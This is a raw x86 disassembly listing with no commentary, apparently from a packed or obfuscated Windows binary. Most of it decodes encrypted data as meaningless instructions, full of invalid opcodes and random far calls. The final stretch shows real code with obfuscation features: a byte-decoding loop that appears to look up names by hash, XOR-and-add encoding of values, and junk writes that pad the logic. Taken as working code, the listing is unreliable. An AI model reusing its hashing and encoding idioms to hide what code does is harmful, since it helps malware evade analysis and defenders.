  41a7ec:	rcr    BYTE PTR [ecx-0x20],cl
  41a7ef:	cli    
  41a7f0:	xchg   edx,eax
  41a7f1:	loopne 0x41a782
  41a7f3:	mov    ch,0x76
  41a7f5:	mov    ebp,0x812742db
  41a7fa:	add    eax,0x7409649e
  41a7ff:	out    0xa7,al
  41a801:	dec    ecx
  41a802:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a803:	call   0x54e02949
  41a808:	adc    DWORD PTR ds:0x907a8472,esp
  41a80e:	xor    eax,eax
  41a810:	dec    edi
  41a811:	sub    ah,cl
  41a813:	mov    dl,0xa4
  41a815:	inc    edx
  41a816:	lods   eax,DWORD PTR ds:[esi]
  41a817:	div    BYTE PTR [esi-0x47e3c456]
  41a81d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a81e:	lea    ebx,[edi]
  41a820:	test   DWORD PTR [edx-0x1261f10f],ebp
  41a826:	pop    ss
  41a827:	aaa    
  41a828:	dec    edx
  41a829:	mov    ah,0x63
  41a82b:	jbe    0x41a85a
  41a82d:	pop    ebx
  41a82e:	xor    ebx,DWORD PTR [edx]
  41a830:	inc    ebp
  41a831:	cmp    DWORD PTR [eax+0x43],eax
  41a834:	adc    DWORD PTR [ecx+0x2d57b471],ebp
  41a83a:	mov    ecx,0xaa49453
  41a83f:	xor    eax,0xf676e1a2
  41a844:	sbb    esi,DWORD PTR [ebp-0x5d]
  41a847:	lds    edx,FWORD PTR [edx+0x610522ed]
  41a84d:	scas   al,BYTE PTR es:[edi]
  41a84e:	and    bl,BYTE PTR [edx]
  41a850:	stos   DWORD PTR es:[edi],eax
  41a851:	test   DWORD PTR [eax+0x4b1ec48a],esi
  41a857:	sub    eax,0x69a5e670
  41a85c:	iret   
  41a85d:	enter  0xb224,0x8e
  41a861:	xchg   ebx,eax
  41a862:	punpcklwd mm1,DWORD PTR ds:0xce7d1f85
  41a869:	ja     0x41a82e
  41a86b:	mov    WORD PTR [esi-0x37],?
  41a86e:	jecxz  0x41a8de
  41a870:	(bad)  
  41a871:	jns    0x41a84f
  41a873:	cmp    ebx,DWORD PTR [ecx-0x16]
  41a876:	mul    ebx
  41a878:	loopne 0x41a883
  41a87a:	rcr    BYTE PTR [eax],cl
  41a87c:	jne    0x41a820
  41a87e:	sub    al,0x28
  41a880:	cmp    ebp,DWORD PTR [ebx]
  41a882:	jg     0x41a900
  41a884:	mov    dh,0xc3
  41a886:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  41a888:	(bad)  [edx+0x898f47f]
  41a88e:	je     0x41a853
  41a890:	mov    bl,0xb3
  41a892:	jnp    0x41a910
  41a894:	adc    eax,0xbc5b213
  41a899:	and    dh,BYTE PTR [edx+0x1d]
  41a89c:	loop   0x41a8d2
  41a89e:	out    dx,eax
  41a89f:	push   ss
  41a8a0:	mov    ebx,0x6571b297
  41a8a5:	jl     0x41a914
  41a8a7:	jo     0x41a8e1
  41a8a9:	retfw  0xf2c8
  41a8ad:	stos   DWORD PTR es:[edi],eax
  41a8ae:	mov    ebx,0xd13a537
  41a8b3:	(bad)  
  41a8b4:	imul   edi,esi,0xffffffe6
  41a8b7:	pusha  
  41a8b8:	sbb    cl,BYTE PTR [edi-0x19]
  41a8bb:	fwait
  41a8bc:	adc    bh,al
  41a8be:	push   0xe97975f
  41a8c3:	push   ds
  41a8c4:	push   cs
  41a8c5:	sbb    esi,DWORD PTR [esi+edi*4]
  41a8c8:	jne    0x41a877
  41a8ca:	stc    
  41a8cb:	je     0x41a8c8
  41a8cd:	lds    ecx,FWORD PTR [edx]
  41a8cf:	push   cs
  41a8d0:	and    ebx,DWORD PTR [edi+eax*4]
  41a8d3:	cwde   
  41a8d4:	mov    al,0xde
  41a8d6:	cmp    BYTE PTR [ecx+0x3557e9f4],bh
  41a8dc:	xor    al,0xdd
  41a8de:	mov    bl,0x82
  41a8e0:	adc    edx,ecx
  41a8e2:	fiadd  WORD PTR [edi]
  41a8e4:	cli    
  41a8e5:	ret    0xf575
  41a8e8:	mov    edx,ss
  41a8ea:	mov    ebp,0x7c61948e
  41a8ef:	jo     0x41a929
  41a8f1:	sub    al,0x87
  41a8f3:	sub    ah,0x69
  41a8f6:	mov    ds:0x43f2a5bf,eax
  41a8fb:	movaps xmm5,xmm6
  41a8fe:	dec    ecx
  41a8ff:	mov    ecx,0xc75d23df
  41a904:	dec    ebp
  41a905:	inc    ecx
  41a906:	push   esp
  41a907:	popf   
  41a908:	loop   0x41a903
  41a90a:	jno    0x41a8bc
  41a90c:	cmp    eax,0x314730bd
  41a911:	inc    ebx
  41a912:	iret   
  41a913:	loope  0x41a961
  41a915:	scas   eax,DWORD PTR es:[edi]
  41a916:	aaa    
  41a917:	fsub   st(0),st
  41a919:	adc    DWORD PTR [edx-0x70c6d656],ebp
  41a91f:	sti    
  41a920:	repz shl DWORD PTR [ecx-0x56],1
  41a924:	test   BYTE PTR [edx+0x25],bh
  41a927:	outs   dx,DWORD PTR ds:[esi]
  41a928:	sub    al,0xf9
  41a92a:	iret   
  41a92b:	dec    ecx
  41a92c:	push   cs
  41a92d:	test   DWORD PTR [eax+0x1640d43d],esp
  41a933:	or     DWORD PTR ds:0xe67291c0,ecx
  41a939:	call   0x2c1c:0x5d880b77
  41a940:	out    0x85,eax
  41a942:	pop    ss
  41a943:	or     al,0xbb
  41a945:	ds imul ecx,ecx,0x40
  41a949:	aad    0x15
  41a94b:	cmp    dh,BYTE PTR [edx+0x349b0de8]
  41a951:	int    0x1e
  41a953:	jnp    0x41a9ac
  41a955:	call   0xd964b7e9
  41a95a:	jmp    0x41a981
  41a95c:	jbe    0x41a906
  41a95e:	pop    edx
  41a95f:	ret    
  41a960:	jb     0x41a92c
  41a962:	cmp    al,0x9b
  41a964:	bnd jge 0x41a933
  41a967:	push   esp
  41a968:	push   edx
  41a969:	push   cs
  41a96a:	inc    eax
  41a96b:	mov    WORD PTR [esi],es
  41a96d:	daa    
  41a96e:	scas   eax,DWORD PTR es:[edi]
  41a96f:	sub    DWORD PTR [ecx+ebx*1],ebx
  41a972:	add    DWORD PTR [ecx+0x1],esi
  41a975:	xor    BYTE PTR [edx-0x683494dd],cl
  41a97b:	adc    DWORD PTR ds:0x72b3c00e,esi
  41a981:	inc    ebx
  41a982:	push   DWORD PTR [esi+esi*4]
  41a985:	jle    0x41a93f
  41a987:	stos   BYTE PTR es:[edi],al
  41a988:	or     DWORD PTR [edi-0x4],ecx
  41a98b:	jbe    0x41a918
  41a98d:	popa   
  41a98e:	xchg   DWORD PTR [ebp-0x30],esp
  41a991:	mov    al,0x4c
  41a993:	lock fst DWORD PTR [ebx+0x7d]
  41a997:	push   es
  41a998:	dec    esi
  41a999:	mov    eax,0xdd301eed
  41a99e:	and    eax,0xa83b0ff9
  41a9a3:	shl    BYTE PTR [eax-0x78],0x90
  41a9a7:	adc    BYTE PTR [edx-0xdc4a3e],bh
  41a9ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a9ae:	mov    ebp,0x135c280d
  41a9b3:	clc    
  41a9b4:	leave  
  41a9b5:	push   ecx
  41a9b6:	imul   ebx,DWORD PTR [eax+0x1866150c],0x449a9444
  41a9c0:	fdivr  DWORD PTR [ecx+0x2c5dcb36]
  41a9c6:	out    dx,eax
  41a9c7:	or     al,0xc1
  41a9c9:	inc    eax
  41a9ca:	adc    esi,ecx
  41a9cc:	pop    edi
  41a9cd:	sbb    ecx,DWORD PTR [ebp+eiz*4-0x5f03c13e]
  41a9d4:	inc    edx
  41a9d5:	adc    al,0x88
  41a9d7:	lea    edx,[edi]
  41a9d9:	jmp    0x41a978
  41a9db:	lea    ebx,[edi]
  41a9dd:	mov    ds:0x77fed0ae,eax
  41a9e2:	sbb    esp,eax
  41a9e4:	ror    ebx,cl
  41a9e6:	xor    ch,BYTE PTR [ebx]
  41a9e8:	dec    ecx
  41a9e9:	mov    ds:0xcdab3a73,al
  41a9ee:	push   ebx
  41a9ef:	mov    esp,0x50906703
  41a9f4:	dec    edi
  41a9f5:	out    0x4e,al
  41a9f7:	inc    edi
  41a9f8:	imul   eax,edx,0xdda0bc2e
  41a9fe:	iret   
  41a9ff:	icebp  
  41aa00:	loop   0x41aa72
  41aa02:	fcmovbe st,st(4)
  41aa04:	gs (bad) 
  41aa06:	mov    edx,esp
  41aa08:	adc    eax,0x264b7ba4
  41aa0d:	inc    esi
  41aa0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa0f:	adc    BYTE PTR [edi+0x6c],0xdb
  41aa13:	scas   eax,DWORD PTR es:[edi]
  41aa14:	in     al,dx
  41aa15:	mov    esi,0x4d6f7d
  41aa1a:	test   BYTE PTR [eax],al
  41aa1c:	inc    edx
  41aa1d:	std    
  41aa1e:	and    BYTE PTR [esi],dh
  41aa20:	call   0x64a7:0x87d8778b
  41aa27:	sbb    esi,DWORD PTR [ebp-0x1a]
  41aa2a:	and    eax,0x96d8cc02
  41aa2f:	addr16 sbb al,0x63
  41aa32:	push   esp
  41aa33:	fiadd  WORD PTR [ebx+0x46cc1c99]
  41aa39:	call   0x58e1b389
  41aa3e:	out    0x91,eax
  41aa40:	test   al,0xaf
  41aa42:	mov    dl,0xcf
  41aa44:	in     al,dx
  41aa45:	mov    ebx,ebx
  41aa47:	and    al,0x8
  41aa49:	ror    DWORD PTR [bx+si-0x20],1
  41aa4d:	imul   eax,DWORD PTR [ebx-0x3a70e902],0x5df67a6e
  41aa57:	add    ch,BYTE PTR [ebp+0x6570a8f0]
  41aa5d:	(bad)  
  41aa5f:	loopne 0x41aa55
  41aa61:	add    BYTE PTR [ebp-0x20],ch
  41aa64:	ja     0x41aa79
  41aa66:	es ja  0x41aa1c
  41aa69:	pop    es
  41aa6a:	cld    
  41aa6b:	dec    edx
  41aa6c:	jo     0x41aa5c
  41aa6e:	push   ecx
  41aa6f:	push   ss
  41aa70:	retf   0x7bca
  41aa73:	fcmovu st,st(5)
  41aa75:	inc    ecx
  41aa76:	jbe    0x41aa9c
  41aa78:	mov    ah,0x1c
  41aa7a:	sbb    eax,0xf095d380
  41aa7f:	imul   ebx,edx,0x8c8a07a
  41aa85:	or     DWORD PTR [eax],ebx
  41aa87:	or     DWORD PTR [ebx+0x66],ebx
  41aa8a:	fs or  eax,0x8b30a458
  41aa90:	fs xor al,0x97
  41aa93:	out    dx,al
  41aa94:	ds or  eax,0x79b691e0
  41aa9a:	or     eax,eax
  41aa9c:	xchg   edx,eax
  41aa9d:	lods   al,BYTE PTR ds:[esi]
  41aa9e:	in     al,0x4e
  41aaa0:	stos   DWORD PTR es:[edi],eax
  41aaa1:	pop    edx
  41aaa2:	sbb    DWORD PTR [edx+0x3c1e3226],ebp
  41aaa8:	add    DWORD PTR [ecx-0x68],edx
  41aaab:	xchg   ecx,eax
  41aaac:	adc    al,0xa3
  41aaae:	pop    es
  41aaaf:	xor    ch,dl
  41aab1:	dec    ebp
  41aab2:	lods   eax,DWORD PTR ds:[esi]
  41aab3:	sub    BYTE PTR [edi-0x751221af],0x67
  41aaba:	test   al,0x73
  41aabc:	or     al,ch
  41aabe:	cwde   
  41aabf:	ffreep st(1)
  41aac1:	test   DWORD PTR [edx-0x55],edx
  41aac4:	scas   eax,DWORD PTR es:[edi]
  41aac5:	jp     0x41aa5c
  41aac7:	push   0x6419c333
  41aacc:	mov    al,0x36
  41aace:	jmp    0x3f94:0x3d4b95b7
  41aad5:	aad    0xf5
  41aad7:	and    bh,dh
  41aad9:	add    eax,0xadc6c270
  41aade:	lea    esi,[esi-0x713a1016]
  41aae4:	stos   DWORD PTR es:[edi],eax
  41aae5:	shl    BYTE PTR [eax+0x36e0322b],0x42
  41aaec:	mov    dh,0xd9
  41aaee:	addr16 adc eax,0x8cae664c
  41aaf4:	leave  
  41aaf5:	loopne 0x41aab2
  41aaf7:	mov    esp,0xe349680e
  41aafc:	icebp  
  41aafd:	xchg   esi,eax
  41aafe:	jbe    0x41ab5b
  41ab00:	mov    ds:0x3aa8e8e4,al
  41ab05:	repnz mov edx,DWORD PTR [ebx+0x12]
  41ab09:	out    dx,al
  41ab0a:	mov    al,0x4
  41ab0c:	pop    ebx
  41ab0d:	push   ebx
  41ab0e:	sbb    BYTE PTR [eax+0x3b],dh
  41ab11:	mov    eax,ds:0xb2c2f43f
  41ab16:	call   DWORD PTR [edx+edi*8+0x37]
  41ab1a:	mov    dh,0xed
  41ab1c:	(bad)  
  41ab1d:	jle    0x41aaf9
  41ab1f:	jbe    0x41ab85
  41ab21:	inc    edx
  41ab22:	fild   DWORD PTR [ebp+0x5acc1cce]
  41ab28:	pop    ebp
  41ab29:	mov    al,0xa2
  41ab2b:	(bad)  
  41ab2c:	xchg   ebx,eax
  41ab2d:	mov    eax,0xbbaf89f0
  41ab32:	mov    al,0x5f
  41ab34:	xchg   edx,eax
  41ab35:	inc    ecx
  41ab36:	aas    
  41ab37:	popa   
  41ab38:	xchg   DWORD PTR [esi],ebx
  41ab3a:	in     eax,0x51
  41ab3c:	sbb    al,bl
  41ab3e:	loopne 0x41ab0c
  41ab40:	adc    cl,0xff
  41ab43:	stos   BYTE PTR es:[edi],al
  41ab44:	mov    edi,0x6f452af7
  41ab49:	lock jge 0x41abb2
  41ab4c:	repz mov bl,0x9d
  41ab4f:	dec    eax
  41ab50:	push   0xffffff84
  41ab52:	lahf   
  41ab53:	test   BYTE PTR [ebp+0x4491b3f5],bl
  41ab59:	cmp    cl,BYTE PTR [ecx+edx*4+0x4e5d158e]
  41ab60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab61:	das    
  41ab62:	push   ss
  41ab63:	pop    esp
  41ab64:	inc    edx
  41ab65:	lahf   
  41ab66:	push   cs
  41ab67:	mov    esp,0x52daedd3
  41ab6c:	push   edx
  41ab6d:	daa    
  41ab6e:	sbb    eax,0x64193506
  41ab73:	imul   edi,eax,0x9b05ab02
  41ab79:	jge    0x41ab75
  41ab7b:	xor    dl,BYTE PTR [ebx]
  41ab7d:	rcr    DWORD PTR [ebp+0x8],0x12
  41ab81:	ret    
  41ab82:	je     0x41ac03
  41ab84:	popa   
  41ab85:	cmc    
  41ab86:	in     al,0x20
  41ab88:	mov    dl,0xed
  41ab8a:	sar    DWORD PTR [edi-0x55f15cad],1
  41ab90:	mov    eax,ds:0x228efcfb
  41ab95:	loope  0x41ab58
  41ab97:	scas   al,BYTE PTR es:[edi]
  41ab98:	sub    eax,0x8aa18f85
  41ab9d:	pop    es
  41ab9e:	mov    ecx,0x7b5fb73a
  41aba3:	loopne 0x41ab63
  41aba5:	jnp    0x41ab45
  41aba7:	ret    
  41aba8:	xlat   BYTE PTR ds:[ebx]
  41aba9:	aam    0x74
  41abab:	popf   
  41abac:	and    al,0xdd
  41abae:	mov    bh,0xa
  41abb0:	test   dh,dl
  41abb2:	mov    dl,0x95
  41abb4:	aad    0x73
  41abb6:	test   BYTE PTR [ecx],dh
  41abb8:	cmc    
  41abb9:	add    BYTE PTR [ebx-0x10],dh
  41abbc:	or     dl,bl
  41abbe:	or     BYTE PTR [ebx+0x3278dcd2],0xbb
  41abc5:	jo     0x41abaf
  41abc7:	mov    eax,DWORD PTR [edx]
  41abc9:	je     0x41aba6
  41abcb:	jbe    0x41ac01
  41abcd:	shl    edx,cl
  41abcf:	push   ebp
  41abd0:	or     ch,BYTE PTR [esi]
  41abd2:	push   eax
  41abd3:	jns    0x41ab82
  41abd5:	loop   0x41ac11
  41abd7:	jge    0x41ac51
  41abd9:	sub    ebx,DWORD PTR [esi+0x12]
  41abdc:	or     ecx,DWORD PTR [ebx]
  41abde:	mov    esp,0x7265bdeb
  41abe3:	dec    eax
  41abe4:	push   cs
  41abe5:	dec    eax
  41abe6:	and    DWORD PTR [eax+0x5e7a2c8c],edx
  41abec:	mov    ds:0xc1c3011c,eax
  41abf1:	sub    edx,esp
  41abf3:	sub    ebp,DWORD PTR [eax-0x9]
  41abf6:	lods   eax,DWORD PTR ds:[esi]
  41abf7:	xor    eax,0xe8b6f822
  41abfc:	out    dx,eax
  41abfd:	and    ebp,esp
  41abff:	push   eax
  41ac00:	shl    BYTE PTR [esi],0x88
  41ac03:	js     0x41ac5c
  41ac05:	mov    ds:0xaaf17eb2,al
  41ac0a:	js     0x41abc2
  41ac0c:	retf   0xe836
  41ac0f:	ret    
  41ac10:	scas   al,BYTE PTR es:[edi]
  41ac11:	dec    esp
  41ac12:	xchg   ecx,eax
  41ac13:	mov    ds:0x15c0b839,al
  41ac18:	call   0x415f:0x7f143bdb
  41ac1f:	fwait
  41ac20:	mov    bl,0x19
  41ac22:	fdiv   st(4),st
  41ac24:	dec    edx
  41ac25:	xchg   esi,eax
  41ac26:	xchg   esi,eax
  41ac27:	fld    DWORD PTR [esi+0x20fc99b0]
  41ac2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac2e:	int    0x80
  41ac30:	xor    bh,BYTE PTR [ebx+0x7e]
  41ac33:	test   al,0x93
  41ac35:	push   0x42654ec8
  41ac3a:	lock jae 0x41ac09
  41ac3d:	rcl    dl,0xf1
  41ac40:	inc    esp
  41ac41:	fisttp DWORD PTR ss:[ecx-0x5aff9d5a]
  41ac48:	jge    0x41ac18
  41ac4a:	or     eax,0xd3d217a0
  41ac4f:	mov    eax,ds:0x27b5f153
  41ac54:	scas   eax,DWORD PTR es:[edi]
  41ac55:	mov    BYTE PTR [esi-0xc],ch
  41ac58:	scas   al,BYTE PTR es:[edi]
  41ac59:	jp     0x41acc3
  41ac5b:	push   esp
  41ac5c:	jg     0x41abff
  41ac5e:	outs   dx,DWORD PTR ds:[esi]
  41ac5f:	pop    edi
  41ac60:	jge    0x41abe7
  41ac62:	cmp    al,0x40
  41ac64:	retf   0x9c59
  41ac67:	repz push edi
  41ac69:	dec    ebp
  41ac6a:	inc    ebx
  41ac6b:	retf   
  41ac6c:	aad    0xef
  41ac6e:	fwait
  41ac6f:	leave  
  41ac70:	mov    dh,0x7b
  41ac72:	dec    edi
  41ac73:	push   ss
  41ac74:	and    BYTE PTR [ecx+0x1c34a1e0],al
  41ac7a:	lods   eax,DWORD PTR ds:[esi]
  41ac7b:	mov    ebx,DWORD PTR [esi]
  41ac7d:	sbb    BYTE PTR [edi-0x30],ah
  41ac80:	stos   BYTE PTR es:[edi],al
  41ac81:	pop    eax
  41ac82:	mov    ah,0x68
  41ac84:	aam    0x66
  41ac86:	shl    DWORD PTR ds:0x40c550a9,cl
  41ac8c:	outs   dx,BYTE PTR ds:[esi]
  41ac8d:	ja     0x41ac3e
  41ac8f:	dec    eax
  41ac90:	or     cl,BYTE PTR [eax]
  41ac92:	xchg   ecx,eax
  41ac93:	int3   
  41ac94:	mov    esp,DWORD PTR [edx]
  41ac96:	mov    ah,0x3a
  41ac98:	rcr    ebx,0xf4
  41ac9b:	add    eax,esi
  41ac9d:	xor    esi,edx
  41ac9f:	xchg   edi,eax
  41aca0:	pop    es
  41aca1:	aam    0x6b
  41aca3:	push   esi
  41aca4:	out    0xd8,eax
  41aca6:	jle    0x41ac83
  41aca8:	push   ebx
  41aca9:	pop    ebx
  41acaa:	add    BYTE PTR [edi],cl
  41acac:	jmp    0x8e1790f1
  41acb1:	cld    
  41acb2:	sub    DWORD PTR [edi+0x63d9027e],edi
  41acb8:	mov    al,0xef
  41acba:	or     eax,0x821e85fa
  41acbf:	out    dx,eax
  41acc0:	pop    ecx
  41acc1:	inc    ebx
  41acc2:	or     DWORD PTR [esi],edx
  41acc4:	push   esp
  41acc5:	xchg   edx,eax
  41acc6:	inc    esi
  41acc7:	adc    DWORD PTR [edx],ecx
  41acc9:	cli    
  41acca:	or     edx,eax
  41accc:	out    0x3b,al
  41acce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41accf:	xchg   ebx,eax
  41acd0:	imul   esi,DWORD PTR [ecx-0x3c137870],0x3845d565
  41acda:	xchg   esp,eax
  41acdb:	mov    WORD PTR [esi+0x3a],ss
  41acde:	stc    
  41acdf:	mov    cl,0x4a
  41ace1:	pushf  
  41ace2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ace3:	mov    esi,DWORD PTR [edi-0x3814fa2d]
  41ace9:	repz mov ?,WORD PTR [edx-0x9]
  41aced:	inc    edx
  41acee:	fisub  DWORD PTR [ecx-0x5b]
  41acf1:	sub    cl,al
  41acf3:	sti    
  41acf4:	jg     0x41ace9
  41acf6:	adc    ch,BYTE PTR [ebx-0x69]
  41acf9:	rcr    BYTE PTR [ecx-0x21e20c6b],cl
  41acff:	mov    ecx,0x706b9fde
  41ad04:	retf   0xe8ef
  41ad07:	or     al,ch
  41ad09:	and    BYTE PTR [eax+0x10],ch
  41ad0c:	xor    al,BYTE PTR [eax]
  41ad0e:	fmul   DWORD PTR [esi]
  41ad10:	push   bx
  41ad12:	int    0xcf
  41ad14:	sub    ecx,DWORD PTR [edi-0x4a49d49b]
  41ad1a:	fidivr DWORD PTR fs:[edi-0x2d36085c]
  41ad21:	cmp    ah,BYTE PTR [ecx+edi*1+0xa12914a]
  41ad28:	in     eax,dx
  41ad29:	aaa    
  41ad2a:	dec    edx
  41ad2b:	in     ax,dx
  41ad2d:	mov    bl,0xa1
  41ad2f:	mov    edx,0xf8476902
  41ad34:	jp     0x41ad99
  41ad36:	adc    DWORD PTR [ebx],esi
  41ad38:	sub    eax,0xdaa6b82b
  41ad3d:	dec    eax
  41ad3e:	mov    esi,0x80e3a11a
  41ad43:	pusha  
  41ad44:	push   0xa9069713
  41ad49:	jle    0x41ad38
  41ad4b:	or     al,0x26
  41ad4d:	jne    0x41ad7f
  41ad4f:	retf   0x93a5
  41ad52:	push   esp
  41ad53:	hlt    
  41ad54:	xor    eax,0x65f11382
  41ad59:	test   al,0x6f
  41ad5b:	push   ecx
  41ad5c:	dec    edx
  41ad5d:	js     0x41add9
  41ad5f:	pop    ebx
  41ad60:	(bad)  
  41ad61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad62:	hlt    
  41ad63:	cmp    al,BYTE PTR es:[edi+eax*8]
  41ad67:	sub    eax,0x2803d754
  41ad6c:	mov    al,0x9b
  41ad6e:	dec    eax
  41ad6f:	add    BYTE PTR [ebx],0xb3
  41ad72:	push   edx
  41ad73:	js     0x41ada7
  41ad75:	popa   
  41ad76:	mov    WORD PTR [esi+ebx*4+0x3a1af7df],gs
  41ad7d:	in     eax,0xb0
  41ad7f:	jl     0x41adca
  41ad81:	imul   esp,edi,0xb17a0e9e
  41ad87:	pop    eax
  41ad88:	sti    
  41ad89:	aad    0xd5
  41ad8b:	mov    cl,0xcd
  41ad8d:	ret    
  41ad8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad8f:	cmp    eax,0xecf3c5b5
  41ad94:	lds    edx,FWORD PTR [edx+0x1a]
  41ad97:	ja     0x41ad9a
  41ad99:	push   ss
  41ad9a:	dec    ebp
  41ad9b:	mov    ds:0xfb8317bb,al
  41ada0:	cmp    al,0xf5
  41ada2:	loopne 0x41adeb
  41ada4:	ret    0x68a
  41ada7:	repz test cl,0x7
  41adab:	push   ebx
  41adac:	es jg  0x41ad80
  41adaf:	push   cs
  41adb0:	sub    ebx,DWORD PTR [ebp+esi*2+0x3f]
  41adb4:	cmp    edx,eax
  41adb6:	ficom  WORD PTR [esi+0x67]
  41adb9:	xchg   edx,eax
  41adba:	mov    ch,0xb3
  41adbc:	daa    
  41adbd:	(bad)  
  41adbe:	push   0x31
  41adc0:	mov    ds,WORD PTR [edx+edx*4]
  41adc3:	pop    ss
  41adc4:	test   edx,eax
  41adc6:	je     0x41ad50
  41adc8:	(bad)  
  41adc9:	sub    eax,0xe6afdc14
  41adce:	pop    edi
  41adcf:	mov    al,0x2d
  41add1:	mov    al,ds:0x5bfb3752
  41add6:	pop    ss
  41add7:	push   esp
  41add8:	lahf   
  41add9:	rcr    BYTE PTR [ebx+ebx*1+0x4e],0x52
  41adde:	rcl    bl,0x19
  41ade1:	add    dl,BYTE PTR [edx]
  41ade3:	loope  0x41ad8e
  41ade5:	xchg   DWORD PTR [ebp-0x48f464d4],esi
  41adeb:	mov    cl,0x89
  41aded:	inc    ebp
  41adee:	clc    
  41adef:	push   DWORD PTR [ebp+0x18]
  41adf2:	jmp    0x41ae4b
  41adf7:	mov    ecx,DWORD PTR [ebp-0x8]
  41adfa:	add    ecx,eax
  41adfc:	mov    DWORD PTR [ebp-0x14],ecx
  41adff:	mov    ecx,DWORD PTR [ebp-0x14]
  41ae02:	mov    ecx,DWORD PTR [ecx+0xc]
  41ae05:	movsx  cx,BYTE PTR [ecx+eax*1]
  41ae0a:	mov    edx,0x3b4b
  41ae0f:	sub    cx,dx
  41ae12:	mov    edx,0x8a85
  41ae17:	xor    cx,dx
  41ae1a:	mov    edx,0x4f85
  41ae1f:	cmp    cx,dx
  41ae22:	jne    0x41adef
  41ae28:	mov    ecx,DWORD PTR ds:0x421c56
  41ae2e:	mov    ecx,DWORD PTR [ecx+0x198]
  41ae34:	mov    DWORD PTR [ecx],eax
  41ae36:	jmp    0x41ae5c
  41ae3b:	mov    ecx,DWORD PTR [ebp+0x18]
  41ae3e:	cmp    ecx,0xf89c85b5
  41ae44:	jne    0x41ae5c
  41ae4a:	push   eax
  41ae4b:	push   DWORD PTR [ebp+0x14]
  41ae4e:	push   DWORD PTR [ebp+0x10]
  41ae51:	push   DWORD PTR [ebp+0xc]
  41ae54:	push   DWORD PTR [ebp+0x8]
  41ae57:	call   0x413d37
  41ae5c:	pop    edi
  41ae5d:	pop    esi
  41ae5e:	leave  
  41ae5f:	ret    0x14
  41ae62:	push   ebp
  41ae63:	mov    ebp,esp
  41ae65:	push   ecx
  41ae66:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  41ae6d:	mov    eax,DWORD PTR [ebp-0x4]
  41ae70:	mov    ecx,DWORD PTR ds:0x42b010
  41ae76:	sbb    DWORD PTR ds:0x42a018,ecx
  41ae7c:	mov    edx,DWORD PTR [ebp+0x10]
  41ae7f:	mov    DWORD PTR ds:0x42801c,0x4950
  41ae89:	mov    ecx,0x7510893
  41ae8e:	sbb    DWORD PTR ds:0x428028,0x4a48
  41ae98:	xor    eax,ecx
  41ae9a:	add    DWORD PTR ds:0x42b000,0x42800c
  41aea4:	add    eax,0x3272db
  41aea9:	mov    DWORD PTR ds:0x42a014,0x169
  41aeb3:	mov    DWORD PTR [edx],eax
  41aeb5:	sbb    eax,edx
  41aeb7:	mov    eax,DWORD PTR [ebp+0xc]
  41aeba:	xor    eax,ecx
  41aebc:	inc    edx
  41aebd:	push   esi
  41aebe:	xor    esi,edx
  41aec0:	mov    esi,DWORD PTR [ebp+0x10]
  41aec3:	mov    edx,0x3272db
  41aec8:	add    eax,edx
  41aeca:	add    DWORD PTR ds:0x42b01c,0x428020
  41aed4:	mov    DWORD PTR [esi+0x4],eax
  41aed7:	mov    eax,DWORD PTR [ebp+0x14]
  41aeda:	mov    esi,DWORD PTR ds:0x428024
  41aee0:	sbb    esi,DWORD PTR ds:0x429010
  41aee6:	mov    DWORD PTR ds:0x428024,esi
  41aeec:	mov    esi,DWORD PTR [ebp+0x10]
  41aeef:	mov    DWORD PTR [esi+0x8],eax
  41aef2:	mov    eax,DWORD PTR [ebp+0x18]
  41aef5:	mov    esi,DWORD PTR [ebp+0x10]
  41aef8:	mov    DWORD PTR [esi+0xc],eax
  41aefb:	mov    eax,DWORD PTR [ebp+0x1c]
  41aefe:	mov    esi,DWORD PTR [ebp+0x10]
  41af01:	mov    DWORD PTR [esi+0x10],eax
  41af04:	mov    eax,DWORD PTR [ebp+0x8]
  41af07:	xor    eax,ecx
  41af09:	add    eax,edx
  41af0b:	pop    esi
  41af0c:	leave  
  41af0d:	ret    0x18
  41af10:	push   ebp
  41af11:	mov    ebp,esp
  41af13:	sub    esp,0x94
  41af19:	mov    eax,DWORD PTR [ebp+0x8]
  41af1c:	push   ebx
  41af1d:	neg    ecx
  41af1f:	push   esi
  41af20:	adc    esi,0x29b8
  41af26:	push   edi
  41af27:	or     edi,DWORD PTR ds:0x42b010
  41af2d:	mov    esi,0x7510893
  41af32:	or     ecx,ecx
  41af34:	xor    eax,esi
  41af36:	mov    edi,0x3272db
  41af3b:	add    eax,edi
  41af3d:	sub    DWORD PTR ds:0x42a018,0x772b
  41af47:	mov    DWORD PTR [ebp-0x38],eax
  41af4a:	mov    eax,ds:0x421ad6
  41af4f:	mov    ecx,DWORD PTR ds:0x428008
  41af55:	and    DWORD PTR ds:0x42b004,ecx
  41af5b:	mov    eax,DWORD PTR [eax]
  41af5d:	mov    DWORD PTR ds:0x42a01c,0x19
  41af67:	cmp    DWORD PTR ds:0x42a01c,0x0
  41af6e:	je     0x41afbe
  41af74:	cmp    DWORD PTR ds:0x42a01c,0x4
  41af7b:	jne    0x41af92
  41af81:	push   0x506a
  41af86:	push   DWORD PTR [ebp-0x24]
  41af89:	push   DWORD PTR [ebp-0x14]
  41af8c:	call   DWORD PTR ds:0x424028
  41af92:	cmp    DWORD PTR ds:0x42a01c,0x5
  41af99:	jne    0x41afac
  41af9f:	mov    ecx,DWORD PTR ds:0x42a01c
  41afa5:	dec    ecx
  41afa6:	mov    DWORD PTR ds:0x42a01c,ecx
  41afac:	mov    ecx,DWORD PTR ds:0x42a01c
  41afb2:	dec    ecx
  41afb3:	mov    DWORD PTR ds:0x42a01c,ecx
  41afb9:	jmp    0x41af67
  41afbe:	mov    DWORD PTR [ebp-0x24],eax
  41afc1:	add    DWORD PTR ds:0x428014,ecx
  41afc7:	mov    eax,ds:0x421cde
  41afcc:	mov    ecx,DWORD PTR ds:0x421a4e
  41afd2:	mov    ecx,DWORD PTR [ecx]
